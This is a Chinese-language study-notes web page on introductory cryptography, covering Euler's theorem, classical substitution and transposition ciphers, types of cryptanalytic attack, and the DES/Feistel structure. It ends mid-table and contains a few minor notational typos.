+这个集合被称为剩余类集，或模n的剩余类</p>
+</li>
+<li>
+<p>给定了数n，则所有的整数都以同余的形式映射到模n的余数的集合上</p>
+<p>Zn＝{0，1，2，3，…，n-1}</p>
+<p>模n的运算可定义在该集合上</p>
+</li>
+</ul>
+<h3 id="欧拉函数" class="headerLink">
+    <a href="#%e6%ac%a7%e6%8b%89%e5%87%bd%e6%95%b0" class="header-mark"></a>欧拉函数</h3><ul>
+<li>
+<p>欧拉函数定义：<code>Φ(n)定义为小于n而互素的正整数的个数</code></p>
+</li>
+<li>
+<p>举例 （p、q都是素数）</p>
+<p><code>Φ(p) ＝ p-1</code></p>
+<p><code>Φ(p×q) =φ(p)φ(q) ＝(p-1)(q-1) ＝pq-p-q+1</code></p>
+</li>
+<li>
+<p>比如n=15</p>
+<p><code>n＝15＝3×5＝p×q</code></p>
+<p>则φ(n)＝(3-1)×(5-1)＝8，即与n互素的元素个数为8个。</p>
+<p><code>1、2、4、7、8、11、13、14 ≡1 mod 15 </code></p>
+<p>而<code>3、 5、 6、9、10、12  ≠ 1 mod 15 </code></p>
+</li>
+<li>
+<p>欧拉函数是RSA中乘法逆元的模（模数）</p>
+</li>
+</ul>
+<h3 id="欧拉定理" class="headerLink">
+    <a href="#%e6%ac%a7%e6%8b%89%e5%ae%9a%e7%90%86" class="header-mark"></a>欧拉定理</h3><p>如果a、n互素，则:
+$$
+a^{φ(n)}≡1 \mod n
+$$
+进一步：
+$$
+a^{φ(n) + 1}≡ a \mod n : 不要求a与n互素
+$$
+欧拉定理的另一种形式是RSA算法中运算成立的基础。</p>
+<h2 id="三传统加密技术" class="headerLink">
+    <a href="#%e4%b8%89%e4%bc%a0%e7%bb%9f%e5%8a%a0%e5%af%86%e6%8a%80%e6%9c%af" class="header-mark"></a>三、传统加密技术</h2><h3 id="密钥算法分类" class="headerLink">
+    <a href="#%e5%af%86%e9%92%a5%e7%ae%97%e6%b3%95%e5%88%86%e7%b1%bb" class="header-mark"></a>密钥算法分类</h3><ul>
+<li>
+<p>根据密钥：</p>
+<ul>
+<li>无密钥：密码转换中不使用任何密钥。（加密哈希函数，伪随机数生成器）</li>
+<li>单密钥：转换的结果是输入数据和单个密钥（称为秘密密钥）的函数。（分组密码对称加密，流密码对称加密，消息认证码）</li>
+<li>双密钥：在计算的不同阶段，使用两个不同但相关的密钥，这两个密钥分别称为私钥和公钥。（非对称加密，数字签名，密钥交换，用户认证）</li>
+</ul>
+</li>
+<li>
+<p>根据算法功能/用途</p>
+<ul>
+<li>加密算法：用于机密性解决方案</li>
+<li>散列函数/消息认证码：用于完整性解决方案</li>
+<li>数字签名：用于认证和不可否认性</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌对称密码基本模型</li>
+</ul>
+</blockquote>
+<p>对称密码也称为传统密码或者单密钥密码，即加密密钥和解密密钥是同一个密钥。优点就是简单，容易实现。</p>
+<p>密码体制(密码)： 从明文到密文的转变过程和从密文到明文的转变过程</p>
+<h3 id="对称密码简化模型" class="headerLink">
+    <a href="#%e5%af%b9%e7%a7%b0%e5%af%86%e7%a0%81%e7%ae%80%e5%8c%96%e6%a8%a1%e5%9e%8b" class="header-mark"></a>对称密码简化模型</h3><p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240102210246079.png" title="image-20240102210246079" data-thumbnail="/posts/cyber_security/image-20240102210246079.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240102210246079.png"
+            srcset="/posts/cyber_security/image-20240102210246079.png, /posts/cyber_security/image-20240102210246079.png 1.5x, /posts/cyber_security/image-20240102210246079.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240102210246079.png" height="742"  width="1313" >
+    </a></figure></p>
+<blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌对加密信息的攻击类型（密码分析学和穷举攻击）</li>
+</ul>
+</blockquote>
+<h3 id="密码分析学" class="headerLink">
+    <a href="#%e5%af%86%e7%a0%81%e5%88%86%e6%9e%90%e5%ad%a6" class="header-mark"></a>✨密码分析学</h3><p>19世纪末，Kerckhoffs假设：假定密码分析者和敌手知道所使用的密码系统，即密码体制的安全性<u>仅依赖于对密钥的保密</u>，而<u>不应依赖于算法的保密</u></p>
+<ul>
+<li>
+<p>假设敌手知道：</p>
+<ul>
+<li>所使用的加密算法</li>
+<li>知道明文的概率分布规律；</li>
+<li>知道密钥的概率分布规律；</li>
+<li>知道所有可能的破译方法</li>
+<li>敌手能够拿到加密装置，可以对其进行能量消耗分析等等</li>
+</ul>
+</li>
+<li>
+<p>敌手目标：</p>
+<ul>
+<li>恢复合法密文相应的明文</li>
+<li>恢复密钥</li>
+</ul>
+</li>
+</ul>
+<h3 id="密码体系的攻击方法" class="headerLink">
+    <a href="#%e5%af%86%e7%a0%81%e4%bd%93%e7%b3%bb%e7%9a%84%e6%94%bb%e5%87%bb%e6%96%b9%e6%b3%95" class="header-mark"></a>✨密码体系的攻击方法</h3><ul>
+<li>
+<p><strong>🎯穷举攻击</strong>：通过试遍所有的密钥来进行破译。使用计算机来对所有可能的密钥组合进行测试， 直到有一个合法的密钥能够把密文还原成明文， 这就是穷举攻击。平均来说，要获得成功必须尝 试所有可能密钥的一半。</p>
+<p>对抗：可增大密钥的数量。</p>
+<ul>
+<li>暴力破解攻击的时间复杂度是 ，当前 n= 128</li>
+<li>暴力攻击的时间复杂度常用于衡量其它密码分析攻击的有效性</li>
+</ul>
+</li>
+<li>
+<p><strong>密码分析攻击</strong>：攻击依赖于加密／解密算法 的性质和明文的一般特征或某些明密文对。这种 攻击企图利用算法的特征来恢复出明文，或者推 导出使用的密钥。目标：获得密钥或明文</p>
+<ul>
+<li>唯密文攻击：仅知道一些密文，最困难，一般是穷举，最易抵抗</li>
+<li>已知明文攻击：知道多个明文，和对应的密文（同一密钥）</li>
+<li>选择明文攻击（Chosen Plaintext Attack，CPA）：分析者选择明文及对应密文，常被作为密码算法安全性分析中的攻击类型假设</li>
+<li>选择密文攻击：分析者选择一些密文，及对应的明文</li>
+<li>选择文本攻击：选择明文及对应的密文，选择一些密文及对应明文</li>
+<li>无条件安全与计算上安全</li>
+</ul>
+</li>
+<li>
+<p><strong>侧信道攻击(side-channel attack)</strong>：探测实现环境的漏洞，如计时攻击、能量分析攻击</p>
+<ul>
+<li>计时攻击: 攻击者分析特定运算的计算时间
+<ul>
+<li>如果当密钥(每一位)具有不同的值时，特定运算的运算时间会发生明显变化，则计时攻击有效</li>
+<li>可以通过在执行指令时加入冗余运算来平滑计算时间</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>能量分析攻击</strong>：攻击者分析特定运算所需的能量</p>
+</li>
+</ul>
+<blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌传统加密技术的两个基本基本模块（代换和置换），以及传统加密算法（单表代换、多表代换和一次一密，注意缺点）</li>
+</ul>
+</blockquote>
+<h3 id="代换和置换古典密码" class="headerLink">
+    <a href="#%e4%bb%a3%e6%8d%a2%e5%92%8c%e7%bd%ae%e6%8d%a2%e5%8f%a4%e5%85%b8%e5%af%86%e7%a0%81" class="header-mark"></a>✨代换和置换（古典密码）</h3><h4 id="常见古典密码算法" class="headerLink">
+    <a href="#%e5%b8%b8%e8%a7%81%e5%8f%a4%e5%85%b8%e5%af%86%e7%a0%81%e7%ae%97%e6%b3%95" class="header-mark"></a>常见古典密码算法</h4><ul>
+<li>
+<p>凯撒密码、单表代换</p>
+</li>
+<li>
+<p>双字母加密：playfair密码</p>
+</li>
+<li>
+<p>线性变换：hill密码</p>
+</li>
+<li>
+<p>多表代换： Vigenère密码</p>
+</li>
+<li>
+<p>转轮机：ENIGMA（二战）</p>
+</li>
+<li>
+<p>One-time Pad(OPT): Vernam密码</p>
+</li>
+<li>
+<p>置换密码</p>
+</li>
+</ul>
+<h4 id="代换技术-caesarshift-cipher移位密码" class="headerLink">
+    <a href="#%e4%bb%a3%e6%8d%a2%e6%8a%80%e6%9c%af-caesarshift-cipher%e7%a7%bb%e4%bd%8d%e5%af%86%e7%a0%81" class="header-mark"></a>代换技术： Caesar/Shift Cipher移位密码</h4><ul>
+<li>
+<p>明文： 26字母</p>
+<p>密文： 26字母</p>
+</li>
+<li>
+<p>加密：每个字母使用其后第3个(循环)代替</p>
+<p>解密：其前第3个，或其后第23个</p>
+</li>
+</ul>
+<blockquote>
+<p>举例：</p>
+<p>​	明文 meet me after class</p>
+<p>​	密文 PHHW PH DIWHU FODVV</p>
+</blockquote>
+<h4 id="加法密码caesar密码是一种加法密码k3" class="headerLink">
+    <a href="#%e5%8a%a0%e6%b3%95%e5%af%86%e7%a0%81caesar%e5%af%86%e7%a0%81%e6%98%af%e4%b8%80%e7%a7%8d%e5%8a%a0%e6%b3%95%e5%af%86%e7%a0%81k3" class="header-mark"></a>加法密码（Caesar密码是一种加法密码）(k=3)</h4><p><code>y=x+k(mod 26)</code></p>
+<ul>
+<li>
+<p>明文：x</p>
+</li>
+<li>
+<p>密文：y</p>
+</li>
+<li>
+<p>密钥：k</p>
+</li>
+</ul>
+<p>解密：<code>x=y-k(mod 26)</code></p>
+<blockquote>
+<p>举例：（Caesar密码)</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">字母</th>
+<th style="text-align:center">a</th>
+<th style="text-align:center">b</th>
+<th style="text-align:center">c</th>
+<th style="text-align:center">d</th>
+<th style="text-align:center">e</th>
+<th style="text-align:center">f</th>
+<th style="text-align:center">g</th>
+<th style="text-align:center">h</th>
+<th style="text-align:center">i</th>
+<th style="text-align:center">j</th>
+<th style="text-align:center">k</th>
+<th style="text-align:center">l</th>
+<th style="text-align:center">m</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">数字</td>
+<td style="text-align:center">0</td>
+<td style="text-align:center">1</td>
+<td style="text-align:center">2</td>
+<td style="text-align:center">3</td>
+<td style="text-align:center">4</td>
+<td style="text-align:center">5</td>
+<td style="text-align:center">6</td>
+<td style="text-align:center">7</td>
+<td style="text-align:center">8</td>
+<td style="text-align:center">9</td>
+<td style="text-align:center">10</td>
+<td style="text-align:center">11</td>
+<td style="text-align:center">12</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>字母</strong></td>
+<td style="text-align:center"><strong>n</strong></td>
+<td style="text-align:center"><strong>o</strong></td>
+<td style="text-align:center"><strong>p</strong></td>
+<td style="text-align:center"><strong>q</strong></td>
+<td style="text-align:center"><strong>r</strong></td>
+<td style="text-align:center"><strong>s</strong></td>
+<td style="text-align:center"><strong>t</strong></td>
+<td style="text-align:center"><strong>u</strong></td>
+<td style="text-align:center"><strong>v</strong></td>
+<td style="text-align:center"><strong>w</strong></td>
+<td style="text-align:center"><strong>x</strong></td>
+<td style="text-align:center"><strong>y</strong></td>
+<td style="text-align:center"><strong>z</strong></td>
+</tr>
+<tr>
+<td style="text-align:center">数字</td>
+<td style="text-align:center">13</td>
+<td style="text-align:center">14</td>
+<td style="text-align:center">15</td>
+<td style="text-align:center">16</td>
+<td style="text-align:center">17</td>
+<td style="text-align:center">18</td>
+<td style="text-align:center">19</td>
+<td style="text-align:center">20</td>
+<td style="text-align:center">21</td>
+<td style="text-align:center">22</td>
+<td style="text-align:center">23</td>
+<td style="text-align:center">24</td>
+<td style="text-align:center">25</td>
+</tr>
+</tbody>
+</table>
+</blockquote>
+<h3 id="单表代换密码" class="headerLink">
+    <a href="#%e5%8d%95%e8%a1%a8%e4%bb%a3%e6%8d%a2%e5%af%86%e7%a0%81" class="header-mark"></a>✨单表代换密码</h3><ul>
+<li>
+<p>单表代换：一个代换表</p>
+</li>
+<li>
+<p>查对照表</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">密文：abcdefghijklmnopqrstuvwxyz
+</span></span><span class="line"><span class="cl">明文：RFAPCBZDQVJHKMWGSYUIXELNTO
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>明文/密文</p>
+<ul>
+<li>meet me after class</li>
+<li>KCCI KC RBUCY AHRUU</li>
+</ul>
+</li>
+<li>
+<p>密钥空间：<code>26！&gt; 10^25</code></p>
+</li>
+</ul>
+<h4 id="单表代换实例" class="headerLink">
+    <a href="#%e5%8d%95%e8%a1%a8%e4%bb%a3%e6%8d%a2%e5%ae%9e%e4%be%8b" class="header-mark"></a>单表代换实例</h4><ul>
+<li>加密</li>
+</ul>
+<blockquote>
+<p>Plain:   abcdefghijklmnopqrstuvwxyz</p>
+<p>Cipher:   DKVQFIBJWPESCXHTMYAUOLRGZN</p>
+<p>Plaintext: <code>if we wish to replace letters</code></p>
+<p>Ciphertext: <code>WI RF RWAJ UH YFTSDVF SFUUFYA</code></p>
+</blockquote>
+<ul>
+<li>解密</li>
+</ul>
+<blockquote>
+<p>Ciphertext: WI RF RWAJ UH YFTSDVF SFUUFYA</p>
+<p>Plaintext: if we wish to replace letters</p>
+<p>Cipher:   <code>ABCDEFGHIJKLMNOPQRSTUVWXYZ</code></p>
+<p>Plain:   <code>sgmakexofhbvqzujdwlptcinry</code></p>
+</blockquote>
+<h4 id="单表代换分析" class="headerLink">
+    <a href="#%e5%8d%95%e8%a1%a8%e4%bb%a3%e6%8d%a2%e5%88%86%e6%9e%90" class="header-mark"></a>单表代换分析</h4><ul>
+<li>
+<p>字母出现频率</p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240102202225422.png" title="image-20240102202225422" data-thumbnail="/posts/cyber_security/image-20240102202225422.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240102202225422.png"
+            srcset="/posts/cyber_security/image-20240102202225422.png, /posts/cyber_security/image-20240102202225422.png 1.5x, /posts/cyber_security/image-20240102202225422.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240102202225422.png" height="731"  width="1350" >
+    </a></figure></p>
+</li>
+<li>
+<p>字母组合概率</p>
+<ul>
+<li>双字母组合：th、he、in、er、</li>
+<li>三字母组合：the、ing、and、</li>
+<li>单词出现概率组合：</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240102202308534.png" title="image-20240102202308534" data-thumbnail="/posts/cyber_security/image-20240102202308534.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240102202308534.png"
+            srcset="/posts/cyber_security/image-20240102202308534.png, /posts/cyber_security/image-20240102202308534.png 1.5x, /posts/cyber_security/image-20240102202308534.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240102202308534.png" height="437"  width="1407" >
+    </a></figure></p>
+</li>
+</ul>
+<h4 id="单表代换攻击步骤" class="headerLink">
+    <a href="#%e5%8d%95%e8%a1%a8%e4%bb%a3%e6%8d%a2%e6%94%bb%e5%87%bb%e6%ad%a5%e9%aa%a4" class="header-mark"></a>单表代换攻击步骤</h4><ol>
+<li>先得有足够多的密文
+<ul>
+<li>几十个</li>
+<li>明文得有明确的意义(古典算法时通常是这样的)</li>
+</ul>
+</li>
+<li>统计密文中各个字母的出现概率</li>
+<li>结合明文的统计
+<ul>
+<li>猜测出现得最多密文字母对应明文字母e(或t、a)，最少的是z(或j)</li>
+<li>猜测出现得最多密文字母双组是th</li>
+<li>观察所谓的明文，并重试</li>
+</ul>
+</li>
+</ol>
+<h3 id="多表代换vigenère密码" class="headerLink">
+    <a href="#%e5%a4%9a%e8%a1%a8%e4%bb%a3%e6%8d%a2vigen%c3%a8re%e5%af%86%e7%a0%81" class="header-mark"></a>✨多表代换(Vigenère密码)</h3><p>使用多个(单)表，如：we are discovered save your self</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">key(repeat)</th>
+<th style="text-align:center"><code>deceptive</code></th>
+<th style="text-align:center"><code>deceptive</code></th>
+<th style="text-align:center"><code>deceptive</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">Plaintext</td>
+<td style="text-align:center"><code>wearedisc</code></td>
+<td style="text-align:center"><code>overedsav</code></td>
+<td style="text-align:center"><code>eyourselef</code></td>
+</tr>
+<tr>
+<td style="text-align:center">Ciphertext</td>
+<td style="text-align:center"><code>ZICVTWQNG</code></td>
+<td style="text-align:center"><code>RZGVTWAVZ</code></td>
+<td style="text-align:center"><code>HCQYGLMGJ</code></td>
+</tr>
+</tbody>
+</table>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240102202919648.png" title="image-20240102202919648" data-thumbnail="/posts/cyber_security/image-20240102202919648.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240102202919648.png"
+            srcset="/posts/cyber_security/image-20240102202919648.png, /posts/cyber_security/image-20240102202919648.png 1.5x, /posts/cyber_security/image-20240102202919648.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240102202919648.png" height="1125"  width="1500" >
+    </a></figure></p>
+<h4 id="字母出现的相对频率" class="headerLink">
+    <a href="#%e5%ad%97%e6%af%8d%e5%87%ba%e7%8e%b0%e7%9a%84%e7%9b%b8%e5%af%b9%e9%a2%91%e7%8e%87" class="header-mark"></a>字母出现的相对频率</h4><p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240102202947258.png" title="image-20240102202947258" data-thumbnail="/posts/cyber_security/image-20240102202947258.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240102202947258.png"
+            srcset="/posts/cyber_security/image-20240102202947258.png, /posts/cyber_security/image-20240102202947258.png 1.5x, /posts/cyber_security/image-20240102202947258.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240102202947258.png" height="789"  width="1191" >
+    </a></figure></p>
+<h3 id="vernam密码1918" class="headerLink">
+    <a href="#vernam%e5%af%86%e7%a0%811918" class="header-mark"></a>Vernam密码（1918）</h3><p>选择一个和明文毫无统计关系，且和明文一样长的密钥，明文与密钥按位异或</p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240102203030719.png" title="image-20240102203030719" data-thumbnail="/posts/cyber_security/image-20240102203030719.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240102203030719.png"
+            srcset="/posts/cyber_security/image-20240102203030719.png, /posts/cyber_security/image-20240102203030719.png 1.5x, /posts/cyber_security/image-20240102203030719.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240102203030719.png" height="697"  width="1162" >
+    </a></figure></p>
+<h3 id="one-time-pad-一次一密" class="headerLink">
+    <a href="#one-time-pad-%e4%b8%80%e6%ac%a1%e4%b8%80%e5%af%86" class="header-mark"></a>✨One-time Pad 一次一密</h3><ul>
+<li>
+<p>举例：哪一个明文/密钥是正确的呢？</p>
+<ul>
+<li>密文 I P K L P S F H G Q</li>
+<li>密钥 U C G S H G B S G N （猜）</li>
+<li>明文 o n e t i m e p a d
+<ul>
+<li><code>one time pad</code></li>
+</ul>
+</li>
+<li>密文 I P K L P S F H G Q</li>
+<li>密钥 D B Q U B Q U T E G （再猜）</li>
+<li>明文
+<ul>
+<li><code>four o’clock</code></li>
+</ul>
+</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240102204501045.png" title="image-20240102204501045" data-thumbnail="/posts/cyber_security/image-20240102204501045.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240102204501045.png"
+            srcset="/posts/cyber_security/image-20240102204501045.png, /posts/cyber_security/image-20240102204501045.png 1.5x, /posts/cyber_security/image-20240102204501045.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240102204501045.png" height="1125"  width="1500" >
+    </a></figure></p>
+<h6 id="一次一密的安全性" class="headerLink">
+    <a href="#%e4%b8%80%e6%ac%a1%e4%b8%80%e5%af%86%e7%9a%84%e5%ae%89%e5%85%a8%e6%80%a7" class="header-mark"></a>一次一密的安全性</h6><ul>
+<li>
+<p>是唯一具有理论安全性的算法</p>
+</li>
+<li>
+<p>也可以直接用于二进制（XOR）</p>
+<ul>
+<li>流密码算法就是使用密钥为种子产生伪随机序列并和明文XOR</li>
+</ul>
+</li>
+<li>
+<p>问题：</p>
+<ul>
+<li>产生大规模随机密钥存在实际困难</li>
+<li>密钥的分发和保护</li>
+</ul>
+</li>
+<li>
+<p>伪随机数生成算法和流密码（见教材八章）</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="无条件安全与计算上安全" class="headerLink">
+    <a href="#%e6%97%a0%e6%9d%a1%e4%bb%b6%e5%ae%89%e5%85%a8%e4%b8%8e%e8%ae%a1%e7%ae%97%e4%b8%8a%e5%ae%89%e5%85%a8" class="header-mark"></a>无条件安全与计算上安全</h4><ul>
+<li>
+<p>无条件安全的(不可破译的)：</p>
+<ul>
+<li>无论截获多少密文，都没有足够信息来唯一确定明文，则该密码是无条件安全的，即对算法的破译不比猜测有优势，如一次一密（one time pad）</li>
+</ul>
+</li>
+<li>
+<p>计算上安全的：</p>
+<ul>
+<li>使用有效资源对一个密码系统进行分析而未能破译，则该密码是强的或计算上安全的</li>
+</ul>
+</li>
+<li>
+<p>密码算法只要满足以下两条准则之一，在实际中即可用：</p>
+<ul>
+<li>破译密文的代价超过被加密信息的价值</li>
+<li>破译密文所花的时间超过信息的有用期</li>
+</ul>
+</li>
+</ul>
+<h4 id="置换技术" class="headerLink">
+    <a href="#%e7%bd%ae%e6%8d%a2%e6%8a%80%e6%9c%af" class="header-mark"></a>置换技术</h4><ul>
+<li>
+<p>Substitution → Transposition</p>
+<p>不是代换，而是重排明文（“洗牌”） ，即明文的字母顺序被打乱了，但明文字母本身不变</p>
+</li>
+</ul>
+<h5 id="更复杂的列置换" class="headerLink">
+    <a href="#%e6%9b%b4%e5%a4%8d%e6%9d%82%e7%9a%84%e5%88%97%e7%bd%ae%e6%8d%a2" class="header-mark"></a>更复杂的列置换</h5><ul>
+<li>把信息一行一行写出来，然后打乱列的次序读出，列的次序就是算法的密钥</li>
+</ul>
+<p>$$
+\begin{split}
+&amp; Key:   &amp; 4\quad3\quad  1\quad  2\quad  5\quad  6\quad  7\\
+&amp; Plaintext:     &amp; a\quad  t\quad  t\quad   a\quad  c\quad k\quad  p\\
+&amp; &amp; o\quad  s\quad  t\quad  p\quad  o\quad  n\quad  e\\
+&amp; &amp; d\quad  u\quad  n\quad  t\quad   i\quad  l\quad   t\\
+&amp; &amp; w\quad  o\quad  a\quad  m\quad  x\quad  y\quad  z\\
+&amp; Ciphertext: &amp; TTNAAPTMTSUOAODWCOIXKNLYPETZ\\
+\end{split}
+$$</p>
+<ul>
+<li>多次置换相对来说更安全</li>
+</ul>
+<h2 id="四分组密码和数据加密标准des" class="headerLink">
+    <a href="#%e5%9b%9b%e5%88%86%e7%bb%84%e5%af%86%e7%a0%81%e5%92%8c%e6%95%b0%e6%8d%ae%e5%8a%a0%e5%af%86%e6%a0%87%e5%87%86des" class="header-mark"></a>四、分组密码和数据加密标准DES</h2><blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌对称密码算法按照对明文的处理方式不同可以分成哪两类? 二者差异</li>
+</ul>
+</blockquote>
+<h3 id="对称密码分类及区别" class="headerLink">
+    <a href="#%e5%af%b9%e7%a7%b0%e5%af%86%e7%a0%81%e5%88%86%e7%b1%bb%e5%8f%8a%e5%8c%ba%e5%88%ab" class="header-mark"></a>✨对称密码分类及区别</h3><ul>
+<li>
+<p>对称密码分为两大类：<strong>分组密码和流密码</strong>。</p>
+<ul>
+<li>
+<p>分组密码(block cipher)：又称块密码，它将明文消息划分成若干长度为m(m&gt;1)的分组（或块），各组分别在长度为r的密钥K的控制下转换成长度为n的密文分组。一般情况下m=n，典型的大小是64位或128位。<u>常见的分组算法有DES、DES3、IDEA、AES等。（公钥密码RSA也属于分组密码）。</u></p>
+</li>
+<li>
+<p>流密码(stream cipher)：又称作序列密码，加密和解密每次只处理数据流的一个符号（如一个字符或一个比特）。（Vernam密码和一次一密）。<u>常见的流算法有RC4， Salsa20/12， ChaCha20-Poly1305等。</u></p>
+</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌DES密码算法的基本参数（明密文分组长度，密钥长度）</li>
+</ul>
+</blockquote>
+<h3 id="分组密码" class="headerLink">
+    <a href="#%e5%88%86%e7%bb%84%e5%af%86%e7%a0%81" class="header-mark"></a>分组密码</h3><h4 id="des数据加密" class="headerLink">
+    <a href="#des%e6%95%b0%e6%8d%ae%e5%8a%a0%e5%af%86" class="header-mark"></a>✨DES数据加密</h4><ul>
+<li>
+<p>Data Encryption Standard</p>
+<ul>
+<li>1971 IBM Horst Feistel
+<ul>
+<li>Lucifer → DES，key由128bit→56bit</li>
+</ul>
+</li>
+<li>1973 NBS征集美国国家密码标准方案，1977 NIST FIPS-46</li>
+<li>1994 最后一次延长到1999年
+<ul>
+<li>AES取代之</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>✨参数</p>
+<ul>
+<li>Feistel体制分组密码</li>
+<li><strong>分组大小 64bit，密钥大小 56bit，轮数 16轮</strong></li>
+<li>S-Boxes</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌Feistel密码结构（具体结构不在考试范围）、混淆（c和k）和扩散（c和m）</li>
+</ul>
+</blockquote>
+<h4 id="feisteldes加密框架" class="headerLink">
+    <a href="#feisteldes%e5%8a%a0%e5%af%86%e6%a1%86%e6%9e%b6" class="header-mark"></a>✨Feistel(DES)加密框架</h4><ul>
+<li>
+<p>明文分组的长n＝2w</p>
+<ul>
+<li>分<strong>左右两半</strong>L0 R0</li>
+</ul>
+</li>
+<li>
+<p>密钥K产生<strong>子密钥</strong>：K→k1，k2，…，kr</p>
+<ul>
+<li>r是轮数，比如16轮</li>
+</ul>
+</li>
+<li>
+<p>⊕是<strong>异或</strong>函数XOR</p>
+<ul>
+<li>p⊕x⊕x = p</li>
+</ul>
+</li>
+<li>
+<p>F是<strong>轮函数</strong></p>
+<ul>
+<li>可以是手工精心构造的查表函数</li>
+</ul>
+</li>
+</ul>
+<h5 id="feistel网络" class="headerLink">
+    <a href="#feistel%e7%bd%91%e7%bb%9c" class="header-mark"></a>✨Feistel网络</h5><p>乘积密码：重复使用代替和置换，实现<strong>混淆(C,K)和扩散(C,M)</strong>。</p>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/1704286188421.png" title="1704286188421" data-thumbnail="/posts/cyber_security/1704286188421.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/1704286188421.png"
+            srcset="/posts/cyber_security/1704286188421.png, /posts/cyber_security/1704286188421.png 1.5x, /posts/cyber_security/1704286188421.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/1704286188421.png" height="736"  width="976" >
+    </a></figure></p>
+<h5 id="feistelfor-loop" class="headerLink">
+    <a href="#feistelfor-loop" class="header-mark"></a>Feistel——&lsquo;for&rsquo; Loop</h5><ul>
+<li>加密计算序列</li>
+</ul>
+<p>$$
+L0＝左半\quad &amp;R0＝右半\
+L1＝R0\quad   &amp;R1＝L0⊕F(k1,R0)\
+L2＝R1\quad  &amp;R2＝L1⊕F(k2,R1)\
+L3＝R3\quad  &amp;R3＝L2⊕F(k3,R2)\
+&hellip;&amp;&hellip;\
+Li＝Ri-1\quad   &amp;Ri＝Li-1⊕F(ki,Ri-1)\
+&hellip;&amp;&hellip;\
+Ln＝Rn-1\quad   &amp;Rn＝Ln-1⊕F(kn,Rn-1)\
+$$</p>
+<ul>
+<li>
+<p>密文即：（Ln，Rn）</p>
+</li>
+<li>
+<p>解密计算：与加密过程一致，逆序使用密钥</p>
+</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240103205451170.png" title="image-20240103205451170" data-thumbnail="/posts/cyber_security/image-20240103205451170.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240103205451170.png"
+            srcset="/posts/cyber_security/image-20240103205451170.png, /posts/cyber_security/image-20240103205451170.png 1.5x, /posts/cyber_security/image-20240103205451170.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240103205451170.png" height="1125"  width="1014" >
+    </a></figure></p>
+<h4 id="des安全强度" class="headerLink">
+    <a href="#des%e5%ae%89%e5%85%a8%e5%bc%ba%e5%ba%a6" class="header-mark"></a>✨DES安全强度</h4><ul>
+<li>
+<p>争论的焦点主要集中于<strong>密钥的长度</strong>和<strong>算法本身的安全性</strong></p>
+</li>
+<li>
+<p>密钥空间太小，仅有56位，穷举攻击</p>
+<ul>
+<li>从Lucifer的2^128^降到DES的2^56^</li>
+<li>2000年1月，DES Challenge III, 22 hours 15 minutes</li>
+</ul>
+</li>
+<li>
+<p>解决DES密钥长度过短，可以采用组合密码技术， 三重DES(简写为DES3或 3DES)是最常用的组合密码技术</p>
+</li>
+</ul>
+<h5 id="穷举密钥搜索所需要的时间" class="headerLink">
+    <a href="#%e7%a9%b7%e4%b8%be%e5%af%86%e9%92%a5%e6%90%9c%e7%b4%a2%e6%89%80%e9%9c%80%e8%a6%81%e7%9a%84%e6%97%b6%e9%97%b4" class="header-mark"></a>穷举密钥搜索所需要的时间</h5><table>
+<thead>
+<tr>
+<th style="text-align:center">Key  Size (bits)</th>
+<th style="text-align:center">Cipher</th>
+<th style="text-align:center">Number  of Alternative Keys</th>
+<th style="text-align:center">Time  Required at 10^9^ Decryptions/s</th>
+<th style="text-align:center">Time  Required at 10^13^Decryptions/s</th>
+</tr>
+</thead>
+<tbody>
+<tr>
